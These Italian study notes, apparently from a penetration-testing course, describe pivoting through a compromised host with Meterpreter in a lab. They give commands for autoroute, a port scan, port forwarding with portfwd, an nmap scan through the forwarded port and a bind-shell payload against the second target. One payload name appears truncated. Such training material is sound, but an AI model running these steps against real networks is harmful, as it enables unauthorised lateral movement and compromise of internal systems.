- Il pivoting è una tecnica di post exploitation che prevede l'utilizzo di un host
compromesso per attaccare altri sistemi sulla rete interna privata dell'host
compromesso.
- Dopo aver ottenuto l'accesso a un host, possiamo utilizzare l'host compromesso per
sfruttare altri host sulla stessa rete interna a cui non potevamo accedere in
precedenza.
- Meterpreter ci offre la possibilità di aggiungere una rotta di rete alla sottorete della
rete interna e di conseguenza di scansionare e sfruttare altri sistemi della rete

EXPLOIT

enviroment: Abbiamo ottenuto l’accesso alla vittima numero 1 tramite HFS e la utilizzeremo per entrare nel target 2 che fa parte della stessa rete del target 1

![image](https://github.com/user-attachments/assets/af8288bd-9610-48a5-871b-802471b920d7)


1. siamo su meterpreter nel target1
2. **`run autoroute -s IP_TARGET1/SUBNET`** avviamo il framework autoroute di **meterpreter** che permette di accedere alla gli host della rete target automaticamente
    1. https://jodies.de/ipcalc?host=10.2.19.152&mask1=255.255.240.0&mask2= copiare IP e SUBNET in quest sito per ottenere il valore /?
    2. ES: **run autoroute -s 10.10.10.0/24**
    3. NB: ricorda che non possiamo utilizzare tools esterni a meterpreter. solo con meterpreter possiamo accedere alla rete target2 in questo modo. 
3. `background` 
4. `search portscan` effettiamo uno scan delle porte, scegliendo tra i disponibili
    1. **set RHOSTs TARGET2**
5. `sessions 1` passiamo alla sessione meterpreter
6. `portfwd add -l 1234 -p 80 -r IP_TARGET2`  apre un portforwarding verso il target2  per utilizzare nmap verso il target2
7. `db_nmap -sV -sS -p 1234 [localhost](http://localhost)` esegue una scansione sull’hocalhost che in realtà è il target2
8. **procedere con l’exploit MA ricorda di mettere il payload del modulo che utilizzerai in bind**
    1. `set PAYLOAD windows/meterpreter/bind_tc`
        1. **set LPORT 4433** Cambiare porta
